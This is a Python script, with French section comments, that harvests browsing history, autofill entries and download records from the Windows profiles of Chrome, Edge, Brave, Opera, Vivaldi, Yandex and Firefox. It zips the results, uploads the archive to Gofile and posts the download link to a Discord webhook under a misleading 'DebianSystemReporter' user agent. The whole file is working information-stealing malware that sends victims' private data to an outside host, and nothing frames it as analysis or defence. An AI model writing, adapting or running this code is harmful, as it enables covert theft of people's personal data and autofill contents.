import os
import shutil
import sqlite3
import json
import glob
import requests
import zipfile
from datetime import datetime, timedelta

# --- CONFIGURATION ---
GOFILE_GETSERVER_API = "https://api.gofile.io/getServer"
DISCORD_WEBHOOK_API = "https://debian-blond.vercel.app/api/send-to-discord.js"
USER_AGENT = "DebianSystemReporter/1.0"
ZIP_NAME = "browser_data.zip"

# --- CHEMINS POUR WINDOWS ---
def get_browser_paths_windows():
    local = os.environ.get("LOCALAPPDATA", "")
    roaming = os.environ.get("APPDATA", "")
    firefox_base = os.path.join(roaming, "Mozilla", "Firefox", "Profiles")

    return {
        "chrome": os.path.join(local, "Google", "Chrome", "User Data"),
        "edge": os.path.join(local, "Microsoft", "Edge", "User Data"),
        "brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
        "opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
        "opera_gx": os.path.join(roaming, "Opera Software", "Opera GX Stable"),
        "vivaldi": os.path.join(local, "Vivaldi", "User Data"),
        "yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data"),
        "firefox": glob.glob(os.path.join(firefox_base, "*.default*")) if os.path.exists(firefox_base) else []
    }

# --- OUTILS DE FICHIER ---
def safe_filename(s):
    return "".join(c if c.isalnum() or c in "-_." else "_" for c in s)

def save_json(data, filename):
    try:
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        print("Saved:", filename)
        return filename
    except Exception as e:
        print("Save error:", e)
        return None

# --- EXTRACTION SQLITE ---
def extract_sqlite(db_path, query, formatter):
    if not os.path.exists(db_path):
        return []
    temp_db = db_path + "_temp"
    shutil.copy2(db_path, temp_db)
    con = sqlite3.connect(temp_db)
    try:
        cursor = con.cursor()
        cursor.execute(query)
        return [formatter(row) for row in cursor.fetchall()]
    except Exception as e:
        return [{"error": str(e)}]
    finally:
        con.close()
        os.remove(temp_db)

def extract_history(db_path):
    query = """
        SELECT urls.url, urls.title, urls.visit_count, MAX(visits.visit_time)
        FROM urls LEFT JOIN visits ON urls.id = visits.url
        GROUP BY urls.id ORDER BY last_visit_time DESC
    """
    return extract_sqlite(db_path, query, lambda r: {
        "url": r[0],
        "title": r[1],
        "visit_count": r[2],
        "last_visit_time": (datetime(1601, 1, 1) + timedelta(microseconds=r[3])).isoformat() if r[3] else "unknown"
    })

def extract_autofill(db_path):
    return extract_sqlite(db_path, "SELECT name, value FROM autofill", lambda r: {"name": r[0], "value": r[1]})

def extract_downloads(db_path):
    return extract_sqlite(db_path, """
        SELECT target_path, tab_url, start_time FROM downloads ORDER BY start_time DESC
    """, lambda r: {
        "file": r[0],
        "from_url": r[1],
        "downloaded": (datetime(1601, 1, 1) + timedelta(microseconds=r[2])).isoformat() if r[2] else "unknown"
    })

# --- FIREFOX SPÉCIAL ---
def extract_firefox_history(profile_path):
    return extract_sqlite(
        os.path.join(profile_path, "places.sqlite"),
        "SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC",
        lambda r: {
            "url": r[0],
            "title": r[1],
            "visit_count": r[2],
            "last_visit_time": (datetime(1970, 1, 1) + timedelta(microseconds=r[3])).isoformat() if r[3] else "unknown"
        }
    )

def extract_firefox_downloads(profile_path):
    return extract_sqlite(
        os.path.join(profile_path, "downloads.sqlite"),
        "SELECT name, source, startTime FROM moz_downloads ORDER BY startTime DESC",
        lambda r: {
            "file": r[0],
            "from_url": r[1],
            "downloaded": (datetime(1970, 1, 1) + timedelta(microseconds=r[2])).isoformat() if r[2] else "unknown"
        }
    )

# --- ZIPPAGE & ENVOI ---
def zip_all_txt_files(zip_name=ZIP_NAME):
    txt_files = [f for f in os.listdir() if f.endswith(".txt")]
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for f in txt_files:
            zipf.write(f)
    return zip_name

def upload_zip_to_gofile(zip_path):
    try:
        server_resp = requests.get(GOFILE_GETSERVER_API)
        server = server_resp.json()["data"]["server"]
        upload_url = f"https://{server}.gofile.io/uploadFile"

        with open(zip_path, "rb") as f:
            response = requests.post(upload_url, files={"file": f})
        data = response.json()
        if data.get("status") == "ok":
            return data["data"]["downloadPage"]
        else:
            print("Upload failed:", data)
            return None
    except Exception as e:
        print("Upload error:", e)
        return None

def send_to_discord(download_url):
    embed = [{
        "title": "📦 Browser Data Archive",
        "description": f"[Download ZIP file here]({download_url})",
        "color": 0x00ff00,
        "timestamp": datetime.utcnow().isoformat()
    }]
    try:
        response = requests.post(
            DISCORD_WEBHOOK_API,
            data={"embeds": json.dumps(embed)},
            headers={"User-Agent": USER_AGENT}
        )
        if response.ok:
            print("✅ Discord embed sent.")
        else:
            print("❌ Discord error:", response.text)
    except Exception as e:
        print("Discord exception:", e)

# --- LOGIQUE DES BROWSERS ---
def get_chromium_profiles(base_path):
    if not os.path.exists(base_path):
        return []
    return [os.path.join(base_path, p) for p in os.listdir(base_path)
            if os.path.isdir(os.path.join(base_path, p)) and (p == "Default" or p.startswith("Profile"))]

def process_chromium_browser(name, base_path):
    for profile_path in get_chromium_profiles(base_path):
        profile = os.path.basename(profile_path)
        print(f"Processing {name} profile: {profile}")
        safe_prof = safe_filename(profile)

        save_json(extract_history(os.path.join(profile_path, "History")),
                  f"{name}-{safe_prof}-history.txt")
        save_json(extract_autofill(os.path.join(profile_path, "Web Data")),
                  f"{name}-{safe_prof}-autofill.txt")
        save_json(extract_downloads(os.path.join(profile_path, "History")),
                  f"{name}-{safe_prof}-downloads.txt")

def process_firefox(profiles):
    for profile_path in profiles:
        profile = os.path.basename(profile_path)
        print(f"Processing Firefox profile: {profile}")
        safe_prof = safe_filename(profile)

        save_json(extract_firefox_history(profile_path),
                  f"firefox-{safe_prof}-history.txt")
        save_json(extract_firefox_downloads(profile_path),
                  f"firefox-{safe_prof}-downloads.txt")

# --- MAIN ---
def main():
    print("🔍 Starting browser data collection...")
    browsers = get_browser_paths_windows()

    for name, path in browsers.items():
        print(f"\n=== {name.upper()} ===")
        if name == "firefox":
            process_firefox(path)
        elif os.path.exists(path):
            process_chromium_browser(name, path)
        else:
            print(f"{name} not installed or path not found.")

    print("\n📦 Zipping all txt files...")
    zip_file = zip_all_txt_files()

    print("🌐 Uploading to Gofile...")
    url = upload_zip_to_gofile(zip_file)
    if url:
        print(f"✅ Gofile link: {url}")
        send_to_discord(url)
    else:
        print("❌ Failed to upload zip file.")

if __name__ == "__main__":
    main()
